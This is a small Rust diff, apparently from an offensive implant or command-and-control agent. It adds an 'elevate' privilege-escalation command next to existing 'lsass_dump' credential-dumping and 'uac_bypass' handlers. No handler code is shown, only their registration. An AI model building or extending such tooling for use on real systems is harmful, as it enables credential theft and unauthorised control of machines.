@@ -133,6 +133,8 @@ async fn main() -> anyhow::Result<()> {
         dispatch.register("lsass_dump", Box::new(lsass_dump::LsassDumpHandler));
         use commands::uac_bypass;
         dispatch.register("uac_bypass", Box::new(uac_bypass::UacBypassHandler));
+        use commands::elevate;
+        dispatch.register("elevate", Box::new(elevate::ElevateHandler));
     }
 
     #[cfg(feature = "http-transport")]
